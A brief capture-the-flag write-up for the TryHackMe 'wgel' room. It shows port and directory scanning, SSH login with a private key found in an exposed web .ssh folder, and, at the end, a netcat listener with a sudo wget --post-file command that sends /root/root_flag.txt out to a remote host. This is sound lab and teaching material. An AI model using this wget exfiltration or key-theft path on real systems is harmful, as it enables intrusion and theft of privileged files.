### wgel ctf
https://tryhackme.com/room/wgelctf

## Enum
```
 ./rustscan -a 10.10.133.56
Open 10.10.133.56:22
Open 10.10.133.56:80
```

```
curl wgel.thm

<!-- Jessie don't forget to udate the webiste -->
```
🚩User:Jessie

```
===============================================================
Gobuster v3.1.0
===============================================================
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   403,404
[+] Extensions:              html,php

/index.html           (Status: 200) [Size: 11374]
/index.html           (Status: 200) [Size: 11374]
/sitemap              (Status: 301) [Size: 314] [--> http://10.10.133.56/sitemap/]
```
```
===============================================================
Gobuster v3.1.0
===============================================================
[+] Url:                     http://10.10.133.56/sitemap/
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/common.txt
[+] Negative Status codes:   403,404
[+] Extensions:              php,html

/.ssh                 (Status: 301) [Size: 319] [--> http://10.10.133.56/sitemap/.ssh/]
/about.html           (Status: 200) [Size: 12232]
/blog.html            (Status: 200) [Size: 12745]
/contact.html         (Status: 200) [Size: 10346]
/css                  (Status: 301) [Size: 318] [--> http://10.10.133.56/sitemap/css/]
/fonts                (Status: 301) [Size: 320] [--> http://10.10.133.56/sitemap/fonts/]
/images               (Status: 301) [Size: 321] [--> http://10.10.133.56/sitemap/images/]
/index.html           (Status: 200) [Size: 21080]
/index.html           (Status: 200) [Size: 21080]
/js                   (Status: 301) [Size: 317] [--> http://10.10.133.56/sitemap/js/]
/services.html        (Status: 200) [Size: 10131]
/shop.html            (Status: 200) [Size: 17257]
/work.html            (Status: 200) [Size: 11428]
```

![image](https://user-images.githubusercontent.com/6504854/178097173-1e41d6ec-d046-41bc-826c-3d590bab378e.png)

```
ssh -i id_rsa jessie@10.10.133.56
cat Documents/user_flag.txt
```

```
sudo -l
Matching Defaults entries for jessie on CorpOne:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User jessie may run the following commands on CorpOne:
    (ALL : ALL) ALL
    (root) NOPASSWD: /usr/bin/wget
```
    
```
nc -lnvp 80
```
    
```
sudo /usr/bin/wget --post-file=/root/root_flag.txt 10.10.10.10    
```

:smile:Happy Hacking. 
